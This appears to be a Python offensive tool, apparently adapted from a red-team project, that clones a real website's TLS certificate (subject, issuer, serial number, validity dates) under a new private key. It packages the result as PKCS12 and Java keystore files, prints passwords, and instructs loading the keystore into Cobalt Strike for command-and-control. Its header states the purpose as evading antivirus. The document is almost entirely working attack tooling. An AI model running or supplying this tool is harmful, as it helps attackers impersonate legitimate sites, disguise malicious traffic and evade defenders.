#!/usr/bin/python3

##From: https://github.com/paranoidninja/CarbonCopy
##Author : Paranoid Ninja
##Email  : paranoidninja@protonmail.com
##Descr  : Spoofs SSL Certificates and Signs executables to evade Antivirus

import ssl
import os
import uuid
import string
import argparse
import random
import sys

from OpenSSL import crypto
from pathlib import Path
from colorama import Fore, Back, Style


TIMESTAMP_URL = "http://sha256timestamp.ws.symantec.com/sha256/timestamp"

def CarbonCopy(host, port, alt_names):
        #Fetching Details
    print("[+] Loading public key of %s in Memory..." % host)
    ogcert = ssl.get_server_certificate((host, int(port)))
    x509 = crypto.load_certificate(crypto.FILETYPE_PEM, ogcert)

    certDir = Path('certs')
    certDir.mkdir(exist_ok=True)

    #Creating Fake Certificate
    CNCRT   = certDir / (host + ".crt")
    CNKEY   = certDir / (host + ".key")
    P12 = certDir / (host + ".p12")
    KEYSTORE   = certDir / (host + ".store")

    #Creating Keygen
    k = crypto.PKey()
    k.generate_key(crypto.TYPE_RSA, ((x509.get_pubkey()).bits()))
    cert = crypto.X509()

    #Setting Cert details from loaded from the original Certificate
    print("[+] Cloning Certificate Version")
    cert.set_version(x509.get_version())
    print("[+] Cloning Certificate Serial Number")
    cert.set_serial_number(x509.get_serial_number())
    print("[+] Cloning Certificate Subject")
    cert.set_subject(x509.get_subject())

    # https://stackoverflow.com/questions/49491732/pyopenssl-how-can-i-get-sansubject-alternative-names-list
    ext_count = x509.get_extension_count()
    for i in range(0, ext_count):
        ext = x509.get_extension(i)
        ext_critical = x509.get_extension(i).get_critical()
        ext_data = ext.__str__()
        try:
            if 'subjectAltName' in str(ext.get_short_name()):
                ext_data += ", DNS:%s"%alt_names
            
            extensions =[
                crypto.X509Extension(
                    ext.get_short_name(),
                    critical=ext_critical,
                    value=ext_data.encode('ascii')
                )
            ]
            cert.add_extensions(extensions)
        except:
            pass

    print("[+] Cloning Certificate Issuer")
    cert.set_issuer(x509.get_issuer())
    print("[+] Cloning Certificate Registration & Expiration Dates")
    cert.set_notBefore(x509.get_notBefore())
    cert.set_notAfter(x509.get_notAfter())
    cert.set_pubkey(k)
    print("[+] Signing Keys")
    cert.sign(k, 'sha256')

    print("[+] Creating %s and %s" %(CNCRT, CNKEY))
    CNCRT.write_bytes(crypto.dump_certificate(crypto.FILETYPE_PEM, cert))
    CNKEY.write_bytes(crypto.dump_privatekey(crypto.FILETYPE_PEM, k))

    print("[+] Creating %s"%P12)
    pkcs12 = crypto.PKCS12()
    pkcs12.set_certificate(cert)
    pkcs12.set_privatekey(k)

    passphrase = uuid.uuid4().hex
    print(Fore.RED + "[+] PKCS12 passphrase: %s"%passphrase + Fore.RESET)
    P12.write_bytes(pkcs12.export(passphrase.encode("utf-8")))
    print("[+] Creating %s"%KEYSTORE)
    keystore_PASS = password_Generator()
    print(Fore.RED + "[+] Keystore password: %s"%keystore_PASS + Fore.RESET)
    os.system("keytool -importkeystore -deststorepass %s -destkeypass %s -destkeystore %s -srckeystore %s -srcstoretype PKCS12 -srcstorepass %s"%(keystore_PASS, keystore_PASS, KEYSTORE, P12, passphrase))
    
    print(Fore.RED + '[+] Repleace "tls ./localhost.crt ./localhost.key" to "tls ./%s.crt ./%s.key" in caddyfile'%(host, host))
    print("[+] Copy %s.store into your cobaltstrike directory and use it (Don't forget modify your C2 malleable profile and teamserver)"%host)

def password_Generator(length=18):                 
    lower = string.ascii_lowercase
    upper = string.ascii_uppercase
    num = string.digits
    all = num + lower + upper
    temp = random.sample(all,length)
    password = "".join(temp)
    return password

if __name__ == "__main__":
    parser = argparse.ArgumentParser(add_help = True, description = "Creates self-signed certificates & keystore by specifing https website")

    parser.add_argument('-t', metavar="www.google.com", action="store", help="Target domain")
    parser.add_argument('-p', metavar="443",action="store", default="443" ,help="Taget SSL port, default is 443")
    parser.add_argument('-l', metavar="192.168.85.100" ,action='store', help='Specify machine local ip address')

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()


    CarbonCopy(options.t, options.p, options.l)